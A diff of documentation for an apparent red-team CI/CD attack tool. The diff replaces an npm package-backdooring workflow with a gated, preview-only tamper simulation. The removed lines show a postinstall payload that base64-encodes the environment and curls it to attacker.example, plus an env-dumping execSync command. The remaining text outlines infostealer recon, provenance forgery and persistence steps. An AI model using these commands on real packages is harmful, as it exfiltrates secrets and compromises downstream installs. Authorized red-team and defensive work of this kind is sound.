@@ -41,35 +41,39 @@ Key paths swept for npm-specific credentials:
 - `NPM_TOKEN` / `NODE_AUTH_TOKEN` environment variables
 - GitLab CI job tokens with registry scope
 
-## 2. npm Package Tampering
+## 2. Authorized Package Tamper Simulation
 
-With registry credentials in hand, use `--npm-tamper` to publish a backdoored version of an internal package. The payload modifies the package's `postinstall` hook to execute arbitrary commands on every `npm install`.
-
-```bash
-gogatoz attack --npm-tamper --target group/npm-project \
-  --npm-package @company/shared-utils \
-  --npm-inject-script 'curl -sS -d "$(printenv|base64 -w0)" https://attacker.example/cb' \
-  --branch gogatoz-attack --deconflict suffix
-```
-
-This creates a CI job that:
-1. Checks out the package source
-2. Injects the payload into the `postinstall` hook in `package.json`
-3. Bumps the patch version
-4. Publishes to the configured npm registry
-
-Every downstream project that runs `npm install` or `npm ci` with the tampered package will execute the injected script.
-
-### Targeting a custom registry
-
-Use `--npm-registry` to target a specific registry (e.g., a project-level GitLab npm registry):
+Start with `--payload-only` to review an isolated package mutation. The default
+job is manual, writes a preview archive, and contains no package install, build,
+or publish command.
 
 ```bash
-gogatoz attack --npm-tamper --target group/npm-project \
-  --npm-package @company/auth-sdk \
-  --npm-registry https://gitlab.example.com/api/v4/projects/42/packages/npm/ \
-  --npm-inject-script 'node -e "require(\"child_process\").execSync(\"env > /tmp/out\")"'
+gogatoz attack --payload-only --payload package-tamper \
+  --tamper-ecosystem npm \
+  --tamper-trigger postinstall \
+  --tamper-inject-script 'node synthetic-marker.js'
 ```
+
+The same workflow supports Python and Ruby import-time entry points:
+
+```bash
+gogatoz attack --payload-only --payload package-tamper \
+  --tamper-ecosystem pypi --tamper-trigger import \
+  --tamper-entry-file src/acme_fixture/__init__.py
+
+gogatoz attack --payload-only --payload package-tamper \
+  --tamper-ecosystem rubygems --tamper-trigger import \
+  --tamper-entry-file lib/acme_fixture.rb
+```
+
+Live publishing requires an explicit package, an HTTPS registry, the exact
+`publish:<ecosystem>:<package>` acknowledgement, a matching protected runtime
+variable, and a human-started manual job. Public registries require another
+opt-in. Keep the workflow in preview mode unless written authorization names
+the exact package and registry.
+
+Do not use a known-malicious third-party package for this exercise. Use only
+synthetic marker code in a package owned by the engagement sponsor.
 
 ## 3. Sigstore Provenance Generation
 
@@ -178,7 +182,7 @@ Note that branch mutator commits across many branches are harder to clean up. Do
 A typical advanced supply chain engagement follows this sequence:
 
 1. **Recon** with `infostealer` payload to discover npm tokens, kubeconfigs, and Vault access
-2. **Tamper** npm packages via `--npm-tamper` with injected postinstall hooks
+2. **Preview** an isolated npm/PyPI/RubyGems mutation with `--payload package-tamper`
 3. **Legitimize** the tampered package with `--sigstore` provenance forgery
 4. **Spread** via `--branch-mutator` to survive targeted branch cleanup
 5. **Persist** with `--dead-mans-switch` for re-entry if access is revoked
